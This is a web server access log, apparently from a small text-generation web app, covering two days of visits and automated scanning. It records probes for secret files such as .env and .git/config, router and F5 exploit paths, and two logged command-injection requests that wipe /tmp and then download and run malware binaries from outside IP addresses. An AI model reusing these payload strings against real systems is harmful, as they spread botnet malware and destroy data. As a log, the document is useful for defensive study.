+172.104.242.173 - - [17/May/2023 03:46:54] "º«d¡EZCÛM\x87î^ý¿\x159 XÔ>\x12\x98Ä<à\x13Ï\x00¬ 9×\x90#8~\x8cÞ\x9dReF¿%1Qà\x9d\x06&g»\x82\x95\x19í\x07\x14\x19ZP\x80+\x94eÃæ\x85\x06¤\x99\x8b\x19l\x01ê\x88Y\x91\x16\x95ÄÈ\x0eH\x02Ç\x93gÁ4FW\x05|ûóT¸ýË»)ãÎÝÍ7\x9eïP\x8c¤[Vý\x98Él\x82õäÁd\x87X÷\x9b¿èq\x12\x99&Û,õ\x87×¨\x97j;ãê§´°\x02­\x8dE\x9bªB\x80\x0e)©é¯}\x18\x8e¸\x1e\x99\x04ï¨\x8cè\x04âÓí)1\x91Á\x8f\x88\x8c\x81ðÛ¥\x88\x95H\x9bZ«Î¿ôE%P*\x88KFY6\x9eç::jÔ\x8a¨V\x9aª«¯Ã&.í[\x04Åe\x7f\x08¾\x8ar§°\x99F÷\x11åÖ\x96\x8cIm+w\x1cýuU\x14\x0f!x¬èMPyÃ\x19!2 íÀ}!Rw\x14\x8e\x1bÄá ¯+­KkÅà\\s\x9c½Ë" HTTPStatus.BAD_REQUEST -
+185.100.87.136 - - [17/May/2023 03:50:32] code 400, message Bad HTTP/0.9 request type ('\x83F\x02\x00\x15\x00\x00\x00R%}gI\\m')
+185.100.87.136 - - [17/May/2023 03:50:32] "\x83F\x02\x00\x15\x00\x00\x00R%}gI\\m\x1e\x05\x16yEFbkD}\x0e[g\x18\x00\x00\x00\x00\x00\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+185.100.87.136 - - [17/May/2023 03:50:32] "POST /index.htm HTTP/1.1" 404 -
+185.100.87.136 - - [17/May/2023 03:50:33] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 -
+192.241.220.16 - - [17/May/2023 05:11:19] code 400, message Bad request syntax ('MGLNDD_45.146.166.164_80')
+192.241.220.16 - - [17/May/2023 05:11:19] "MGLNDD_45.146.166.164_80" HTTPStatus.BAD_REQUEST -
+45.95.169.240 - - [17/May/2023 05:21:30] "GET / HTTP/1.1" 200 -
+167.94.145.57 - - [17/May/2023 05:34:02] "GET / HTTP/1.1" 200 -
+167.94.145.57 - - [17/May/2023 05:34:02] "GET / HTTP/1.1" 200 -
+167.94.145.57 - - [17/May/2023 05:34:02] code 505, message Invalid HTTP version (2.0)
+167.94.145.57 - - [17/May/2023 05:34:02] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.145.57 - - [17/May/2023 05:34:02] "GET /favicon.ico HTTP/1.1" 404 -
+45.95.169.240 - - [17/May/2023 06:05:47] "GET / HTTP/1.1" 200 -
+45.95.169.240 - - [17/May/2023 06:05:47] "POST /dvr/cmd HTTP/1.1" 404 -
+45.95.169.240 - - [17/May/2023 06:05:48] "POST /cn/cmd HTTP/1.1" 404 -
+220.134.205.118 - - [17/May/2023 06:05:52] "GET / HTTP/1.1" 200 -
+162.142.125.216 - - [17/May/2023 06:28:23] "GET / HTTP/1.1" 200 -
+162.142.125.216 - - [17/May/2023 06:28:23] "GET / HTTP/1.1" 200 -
+162.142.125.216 - - [17/May/2023 06:28:24] code 505, message Invalid HTTP version (2.0)
+162.142.125.216 - - [17/May/2023 06:28:24] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.216 - - [17/May/2023 06:28:24] "GET /favicon.ico HTTP/1.1" 404 -
+138.197.12.239 - - [17/May/2023 06:54:56] "GET / HTTP/1.1" 200 -
+138.197.12.239 - - [17/May/2023 06:54:57] "GET /favicon.ico HTTP/1.1" 404 -
+138.197.12.239 - - [17/May/2023 06:54:58] "GET / HTTP/1.0" 200 -
+89.218.247.130 - - [17/May/2023 06:58:09] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [17/May/2023 06:58:11] "GET /static/style.css HTTP/1.1" 200 -
+89.218.247.130 - - [17/May/2023 06:58:13] "GET /favicon.ico HTTP/1.1" 404 -
+89.218.247.130 - - [17/May/2023 07:04:31] "GET /files.html HTTP/1.1" 200 -
+89.218.247.130 - - [17/May/2023 07:04:31] "GET /static/files.css HTTP/1.1" 200 -
+195.238.122.25 - - [17/May/2023 07:22:31] "GET /.git/config HTTP/1.1" 404 -
+92.46.127.106 - - [17/May/2023 09:26:18] "GET / HTTP/1.1" 200 -
+92.46.127.106 - - [17/May/2023 09:26:18] "GET /static/style.css HTTP/1.1" 304 -
+92.46.127.106 - - [17/May/2023 09:27:03] "POST /generate_text HTTP/1.1" 200 -
+92.46.127.106 - - [17/May/2023 09:27:03] "GET /static/style.css HTTP/1.1" 304 -
+198.235.24.175 - - [17/May/2023 09:28:39] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.175 - - [17/May/2023 09:28:39] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ý\x17(aaÀ\x89zí\x8f)î³Í\x96Yk?¼\x88\x1c\x06fx<Q&«\x12ö/ñ\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+92.46.127.106 - - [17/May/2023 09:35:30] "GET /static/style.css HTTP/1.1" 200 -
+142.93.46.6 - - [17/May/2023 09:43:51] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03«\x9dfQs\x9f¦\x14')
+142.93.46.6 - - [17/May/2023 09:43:51] "\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03«\x9dfQs\x9f¦\x14\x85Ü1Ñ\x8e\x84\x0eÚ×d\x0f¨ýKì\x81îÜ=\x19©IÈv\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+179.43.177.243 - - [17/May/2023 10:15:24] "GET / HTTP/1.1" 200 -
+198.199.117.72 - - [17/May/2023 10:29:23] "GET /druid/index.html HTTP/1.1" 404 -
+14.232.161.4 - - [17/May/2023 10:44:35] code 400, message Bad request version ("Ëë\x00p\x13\x02\x13\x01\x13\x03À,À+Ì©À0Ì¨À/\x00\x9fÌª\x00£\x00\x9e\x00¢À$À(À#À'\x00k\x00j\x00g\x00@À.À2À-À1À&À*À%À)À")
+14.232.161.4 - - [17/May/2023 10:44:35] "\x16\x03\x03\x01\x8e\x01\x00\x01\x8a\x03\x03¯¼Ï}kí\x1c7â'ÿ¬6\x0d1qéLq3»å2`T\x82\x8aO#{uu Ý\x08ÜW¸¬ý-cDJQ\x9b{¹ò\x9d\x1dÍ\x903\x9c¦æålfÔ] Ëë\x00p\x13\x02\x13\x01\x13\x03À,À+Ì©À0Ì¨À/\x00\x9fÌª\x00£\x00\x9e\x00¢À$À(À#À'\x00k\x00j\x00g\x00@À.À2À-À1À&À*À%À)À" HTTPStatus.BAD_REQUEST -
+78.142.18.220 - - [17/May/2023 11:29:14] "GET / HTTP/1.1" 200 -
+109.237.98.226 - - [17/May/2023 11:42:06] "GET /.env HTTP/1.1" 404 -
+109.237.98.226 - - [17/May/2023 11:42:06] code 400, message Bad request version ('í5\x91_+\x16±_¸«O¬a1ÝÂ\x0fûgé¢}:V¹\x8f\x9c\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.98.226 - - [17/May/2023 11:42:06] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03×Bªª9\x19ÿo³y\x9a¥\x1dG¼§ùK\x8c\x12à\x96­´®ª\x99Ã°Ç]& Ñ³í\x9e\x09í5\x91_+\x16±_¸«O¬a1ÝÂ\x0fûgé¢}:V¹\x8f\x9c\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+64.62.197.6 - - [17/May/2023 12:39:36] "GET / HTTP/1.1" 200 -
+64.62.197.7 - - [17/May/2023 12:40:40] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.6 - - [17/May/2023 12:41:26] "GET /geoserver/web/ HTTP/1.1" 404 -
+172.104.11.46 - - [17/May/2023 13:32:38] code 400, message Bad request version ('À\x14À')
+172.104.11.46 - - [17/May/2023 13:32:38] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x8e¢ªÉ\x9búª\x91&×_\x1fd´\x95×z\x86ñ\x04$cëÀ\x01Áô\x16ÿñ&×\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+46.34.193.49 - - [17/May/2023 14:08:59] "GET /favicon.ico HTTP/1.1" 404 -
+113.30.148.166 - - [17/May/2023 14:30:22] "GET /.git/config HTTP/1.1" 404 -
+193.42.32.124 - - [17/May/2023 14:59:55] "GET / HTTP/1.1" 200 -
+46.34.193.49 - - [17/May/2023 15:37:26] "GET /favicon.ico HTTP/1.1" 404 -
+192.241.227.9 - - [17/May/2023 15:40:37] "GET / HTTP/1.1" 200 -
+31.220.1.83 - - [17/May/2023 15:42:49] "GET / HTTP/1.1" 200 -
+103.101.81.142 - - [17/May/2023 15:57:45] "GET / HTTP/1.1" 200 -
+185.80.32.60 - - [17/May/2023 16:03:14] "GET / HTTP/1.1" 200 -
+113.30.148.166 - - [17/May/2023 16:05:10] "GET /.git/config HTTP/1.1" 404 -
+87.121.221.49 - - [17/May/2023 17:00:59] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+93.179.110.177 - - [17/May/2023 17:05:25] "GET / HTTP/1.1" 200 -
+45.95.169.240 - - [17/May/2023 17:47:22] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:18] code 400, message Bad request version ('À\x13À')
+207.154.240.169 - - [17/May/2023 17:49:18] "\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03µÆÀA\x86\x0fÌÄÑØ&ó­¿Ù2"\x8fú\x19o'\x05ì\x18 '\x80º&8° úßÈ§E·\x06ª\x06ó/'ñ[ê{[üÚ³±ö\x8e\x16V\x83/\x8c\x1c±ÏË\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+207.154.240.169 - - [17/May/2023 17:49:18] "GET / HTTP/1.1" 200 -
+207.154.240.169 - - [17/May/2023 17:49:18] "GET / HTTP/1.1" 200 -
+207.154.240.169 - - [17/May/2023 17:49:19] "GET /.vscode/sftp.json HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:19] "GET /about HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:19] "GET /debug/default/view?panel=config HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:19] "GET /v2/_catalog HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:19] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:19] "GET /server-status HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:20] "GET /login.action HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:20] "GET /_all_dbs HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:20] "GET /.DS_Store HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:20] "GET /.env HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:21] "GET /.git/config HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:21] "GET /s/436313e2636313e2634313e25343/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:21] "GET /config.json HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:21] "GET /telescope/requests HTTP/1.1" 404 -
+207.154.240.169 - - [17/May/2023 17:49:21] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 -
+113.30.148.166 - - [17/May/2023 17:56:19] "GET /.git/config HTTP/1.1" 404 -
+78.142.18.220 - - [17/May/2023 18:37:19] "GET / HTTP/1.1" 200 -
+159.223.136.180 - - [17/May/2023 18:47:31] "GET / HTTP/1.1" 200 -
+194.87.151.56 - - [17/May/2023 20:14:26] "CONNECT google.com:443 HTTP/1.1" 404 -
+46.34.193.49 - - [17/May/2023 20:45:01] "GET /favicon.ico HTTP/1.1" 404 -
+94.102.61.10 - - [17/May/2023 21:45:36] "GET / HTTP/1.1" 200 -
+45.128.232.62 - - [17/May/2023 21:58:39] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+68.183.82.102 - - [17/May/2023 22:05:37] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x89í#\x1bGW')
+68.183.82.102 - - [17/May/2023 22:05:37] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x89í#\x1bGW" HTTPStatus.BAD_REQUEST -
+68.183.82.102 - - [17/May/2023 22:05:37] code 400, message Bad request version ('À\x14À')
+68.183.82.102 - - [17/May/2023 22:05:37] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x03c\x80bÃy÷\x96Ç\x18®é{Îº\x1e\x14ûÃO\x87ª\x9aYÎ\x80k0m¬\x12L\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+68.183.82.102 - - [17/May/2023 22:05:37] "GET / HTTP/1.1" 200 -
+68.183.82.102 - - [17/May/2023 22:05:38] "GET /client/get_targets HTTP/1.1" 404 -
+68.183.82.102 - - [17/May/2023 22:05:38] "GET /upl.php HTTP/1.1" 404 -
+68.183.82.102 - - [17/May/2023 22:05:39] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ç^\x04teÊWeç\x06¢\x9a¸ÜbÎ\x98¥§\x1b\x8e,')
+68.183.82.102 - - [17/May/2023 22:05:39] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ç^\x04teÊWeç\x06¢\x9a¸ÜbÎ\x98¥§\x1b\x8e," HTTPStatus.BAD_REQUEST -
+68.183.82.102 - - [17/May/2023 22:05:39] "GET /geoip/ HTTP/1.1" 404 -
+68.183.82.102 - - [17/May/2023 22:05:39] "GET / HTTP/1.1" 200 -
+68.183.82.102 - - [17/May/2023 22:05:40] "GET /favicon.ico HTTP/1.1" 404 -
+68.183.82.102 - - [17/May/2023 22:05:40] "GET /1.php HTTP/1.1" 404 -
+78.142.18.220 - - [17/May/2023 22:43:18] "GET / HTTP/1.1" 200 -
+103.149.192.26 - - [17/May/2023 22:44:59] "GET / HTTP/1.1" 200 -
+45.79.181.251 - - [17/May/2023 22:56:54] "GET / HTTP/1.1" 200 -
+18.191.207.131 - - [17/May/2023 23:01:00] "GET / HTTP/1.1" 200 -
+18.191.207.131 - - [17/May/2023 23:03:41] "GET / HTTP/1.1" 200 -
+45.8.223.207 - - [18/May/2023 01:03:34] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [18/May/2023 02:33:38] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+35.195.93.98 - - [18/May/2023 02:33:41] "GET / HTTP/1.1" 200 -
+177.54.147.116 - - [18/May/2023 02:41:27] "GET /.env HTTP/1.1" 404 -
+177.54.147.116 - - [18/May/2023 02:41:28] "GET /wp-content/ HTTP/1.1" 404 -
+45.128.232.121 - - [18/May/2023 03:35:34] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+152.89.196.144 - - [18/May/2023 04:14:34] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+65.49.20.66 - - [18/May/2023 04:49:10] "GET / HTTP/1.1" 200 -
+65.49.20.66 - - [18/May/2023 04:50:37] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.20.66 - - [18/May/2023 04:51:42] "GET /geoserver/web/ HTTP/1.1" 404 -
+205.210.31.135 - - [18/May/2023 05:04:52] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03')
+205.210.31.135 - - [18/May/2023 05:04:52] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x09}\x93/\x83½\\¾+Õ\x96" HTTPStatus.BAD_REQUEST -
+193.35.18.88 - - [18/May/2023 05:13:36] "GET / HTTP/1.1" 200 -
+193.35.18.88 - - [18/May/2023 05:13:36] "POST /HNAP1/ HTTP/1.1" 404 -
+31.59.200.6 - - [18/May/2023 05:13:54] "GET / HTTP/1.1" 200 -
+45.95.169.240 - - [18/May/2023 06:15:13] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+85.159.27.200 - - [18/May/2023 06:33:44] "GET /favicon.ico HTTP/1.1" 404 -
+85.159.27.200 - - [18/May/2023 06:33:46] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:33:46] "GET /static/style.css HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:33:49] "GET /favicon.ico HTTP/1.1" 404 -
+85.159.27.200 - - [18/May/2023 06:34:02] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:34:05] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:35:16] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:35:16] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:36:07] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:36:07] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:37:02] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:37:02] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:37:37] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:37:37] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:37:47] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:37:48] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:40:00] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:40:00] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:40:18] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:40:19] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:41:15] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:41:15] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:41:39] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:41:39] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:42:13] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:42:13] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:42:49] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:42:49] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:43:25] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:43:25] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [18/May/2023 06:43:44] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [18/May/2023 06:43:47] "GET /static/style.css HTTP/1.1" 304 -
+89.218.247.130 - - [18/May/2023 07:19:37] "GET /generate_text HTTP/1.1" 405 -
+89.218.247.130 - - [18/May/2023 07:19:37] "GET /favicon.ico HTTP/1.1" 404 -
+89.218.247.130 - - [18/May/2023 07:21:24] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [18/May/2023 07:21:25] "GET /static/style.css HTTP/1.1" 200 -
+89.218.247.130 - - [18/May/2023 07:21:29] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [18/May/2023 07:21:29] "GET /static/style.css HTTP/1.1" 304 -
+89.218.247.130 - - [18/May/2023 07:22:16] "POST /generate_text HTTP/1.1" 200 -
+89.218.247.130 - - [18/May/2023 07:22:16] "GET /static/style.css HTTP/1.1" 304 -
+89.218.247.130 - - [18/May/2023 07:22:33] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [18/May/2023 07:22:33] "GET /static/style.css HTTP/1.1" 304 -
+194.113.236.177 - - [18/May/2023 07:31:16] "POST /mgmt/tm/util/bash HTTP/1.1" 404 -
+194.113.236.177 - - [18/May/2023 07:31:17] "GET / HTTP/1.1" 200 -
+41.34.110.192 - - [18/May/2023 07:43:16] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.188.166.164/jaws;sh+/tmp/jaws HTTP/1.1')
+41.34.110.192 - - [18/May/2023 07:43:16] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.188.166.164/jaws;sh+/tmp/jaws HTTP/1.1" HTTPStatus.BAD_REQUEST -
+193.35.18.65 - - [18/May/2023 07:50:14] "GET / HTTP/1.1" 200 -
+193.35.18.65 - - [18/May/2023 07:50:14] "POST /HNAP1/ HTTP/1.1" 404 -
+193.42.32.124 - - [18/May/2023 08:03:08] "GET / HTTP/1.1" 200 -
+206.189.115.46 - - [18/May/2023 08:05:31] code 400, message Bad request version ('´L?\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+206.189.115.46 - - [18/May/2023 08:05:31] "\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03©Xk\x13¥[þ½\x00¼ªkq\x05hó¾\x93\x15^îÜ\x83Þ\x1eu3Æ\x0d´L?\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+47.236.30.53 - - [18/May/2023 08:10:11] code 400, message Bad request syntax ('test')
+47.236.30.53 - - [18/May/2023 08:10:11] "test" HTTPStatus.BAD_REQUEST -
+47.236.30.53 - - [18/May/2023 08:10:17] code 400, message Bad request syntax ('VERSION')
+47.236.30.53 - - [18/May/2023 08:10:17] "VERSION" HTTPStatus.BAD_REQUEST -
+47.236.30.53 - - [18/May/2023 08:10:22] code 400, message Bad HTTP/0.9 request type ('GIOP\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00')
+47.236.30.53 - - [18/May/2023 08:10:22] "GIOP\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x0bNameService" HTTPStatus.BAD_REQUEST -
+47.236.30.53 - - [18/May/2023 08:10:23] "GET / HTTP/1.0" 200 -
+47.236.30.53 - - [18/May/2023 08:10:26] "GET / HTTP/1.1" 200 -
+47.236.30.53 - - [18/May/2023 08:10:28] "GET /sitemap.xml HTTP/1.1" 404 -
+47.236.30.53 - - [18/May/2023 08:10:28] "GET /robots.txt HTTP/1.1" 404 -
+78.37.119.101 - - [18/May/2023 08:14:01] "GET / HTTP/1.1" 200 -
+78.37.119.101 - - [18/May/2023 08:14:01] "GET / HTTP/1.1" 200 -
+94.102.61.80 - - [18/May/2023 09:30:57] "GET / HTTP/1.1" 200 -
+94.102.61.80 - - [18/May/2023 09:32:16] "GET / HTTP/1.1" 200 -
+198.235.24.211 - - [18/May/2023 09:55:55] "GET / HTTP/1.0" 200 -
+103.116.52.145 - - [18/May/2023 10:29:27] "GET / HTTP/1.1" 200 -
+5.11.68.54 - - [18/May/2023 10:32:18] "GET / HTTP/1.1" 200 -
+46.34.193.17 - - [18/May/2023 10:48:57] "GET /favicon.ico HTTP/1.1" 404 -
+78.37.119.99 - - [18/May/2023 10:56:47] "GET / HTTP/1.1" 200 -
+2.189.222.82 - - [18/May/2023 12:19:08] "GET / HTTP/1.1" 200 -
+178.128.152.119 - - [18/May/2023 12:21:32] "GET / HTTP/1.0" 200 -
+103.38.237.172 - - [18/May/2023 12:27:34] "GET / HTTP/1.1" 200 -
+198.199.114.229 - - [18/May/2023 12:59:42] code 400, message Bad request syntax ('MGLNDD_45.146.166.164_80')
+198.199.114.229 - - [18/May/2023 12:59:42] "MGLNDD_45.146.166.164_80" HTTPStatus.BAD_REQUEST -
+106.75.67.217 - - [18/May/2023 13:26:40] "GET / HTTP/1.1" 200 -
+45.238.66.129 - - [18/May/2023 13:33:41] "POST /mgmt/tm/util/bash HTTP/1.1" 404 -
+45.238.66.129 - - [18/May/2023 13:33:41] "GET / HTTP/1.1" 200 -
+45.79.181.179 - - [18/May/2023 14:00:12] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+45.79.181.179 - - [18/May/2023 14:00:12] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03¨×äß)\x03" HTTPStatus.BAD_REQUEST -
+193.35.18.65 - - [18/May/2023 14:15:00] "GET / HTTP/1.1" 200 -
+193.35.18.65 - - [18/May/2023 14:15:00] "POST /HNAP1/ HTTP/1.1" 404 -
+109.205.213.10 - - [18/May/2023 14:26:39] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 109.205.213.3/bins/UnHAnaAW.arm;chmod+777+/tmp/UnHAnaAW.arm;sh+/tmp/UnHAnaAW.arm HTTP/1.1')
+109.205.213.10 - - [18/May/2023 14:26:39] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 109.205.213.3/bins/UnHAnaAW.arm;chmod+777+/tmp/UnHAnaAW.arm;sh+/tmp/UnHAnaAW.arm HTTP/1.1" HTTPStatus.BAD_REQUEST -
+185.233.19.75 - - [18/May/2023 14:59:43] "GET / HTTP/1.1" 200 -
+183.136.225.32 - - [18/May/2023 15:18:38] "GET / HTTP/1.1" 200 -
+183.136.225.32 - - [18/May/2023 15:27:32] "GET / HTTP/1.1" 200 -
+183.136.225.32 - - [18/May/2023 15:27:35] "GET /favicon.ico HTTP/1.1" 404 -
+183.136.225.32 - - [18/May/2023 15:27:36] "GET /robots.txt HTTP/1.1" 404 -
+103.14.26.208 - - [18/May/2023 15:36:14] "GET /restore.php HTTP/1.1" 404 -
+162.243.141.22 - - [18/May/2023 15:41:43] "GET / HTTP/1.1" 200 -
+167.94.138.50 - - [18/May/2023 15:44:27] "GET / HTTP/1.1" 200 -
+167.94.138.50 - - [18/May/2023 15:44:28] code 505, message Invalid HTTP version (2.0)
+167.94.138.50 - - [18/May/2023 15:44:28] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.50 - - [18/May/2023 15:44:28] "GET /favicon.ico HTTP/1.1" 404 -
+46.34.193.17 - - [18/May/2023 15:56:08] "GET /favicon.ico HTTP/1.1" 404 -
+103.116.52.145 - - [18/May/2023 15:56:11] "GET / HTTP/1.1" 200 -
+45.95.169.240 - - [18/May/2023 16:37:14] "GET / HTTP/1.1" 200 -
+128.14.209.162 - - [18/May/2023 16:48:23] "GET / HTTP/1.1" 200 -
+3.84.182.98 - - [18/May/2023 16:51:39] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [18/May/2023 16:54:27] "GET /robots.txt HTTP/1.1" 404 -
+62.84.32.240 - - [18/May/2023 16:54:28] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [18/May/2023 16:54:28] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [18/May/2023 16:54:29] "GET /favicon.ico HTTP/1.1" 404 -
+176.222.167.124 - - [18/May/2023 17:15:14] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:15:14] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:15:15] "GET /favicon.ico HTTP/1.1" 404 -
+95.108.213.169 - - [18/May/2023 17:15:51] "GET /robots.txt HTTP/1.1" 404 -
+95.108.213.175 - - [18/May/2023 17:15:52] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:16:24] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:16:24] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:16:36] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:16:36] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:17:08] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:17:08] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:17:12] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:17:12] "GET /static/style.css HTTP/1.1" 304 -
+213.180.203.142 - - [18/May/2023 17:17:33] "GET /files.html HTTP/1.1" 200 -
+213.180.203.24 - - [18/May/2023 17:19:04] "GET /file3.pdf HTTP/1.1" 404 -
+213.180.203.36 - - [18/May/2023 17:19:05] "GET /file1.pdf HTTP/1.1" 404 -
+5.255.231.170 - - [18/May/2023 17:19:06] "GET /file2.pdf HTTP/1.1" 404 -
+198.20.69.98 - - [18/May/2023 17:26:35] "GET / HTTP/1.1" 200 -
+198.20.69.98 - - [18/May/2023 17:26:39] "GET /robots.txt HTTP/1.1" 404 -
+198.20.69.98 - - [18/May/2023 17:26:40] "GET /sitemap.xml HTTP/1.1" 404 -
+198.20.69.98 - - [18/May/2023 17:26:41] "GET /.well-known/security.txt HTTP/1.1" 404 -
+198.20.69.98 - - [18/May/2023 17:26:48] "GET /favicon.ico HTTP/1.1" 404 -
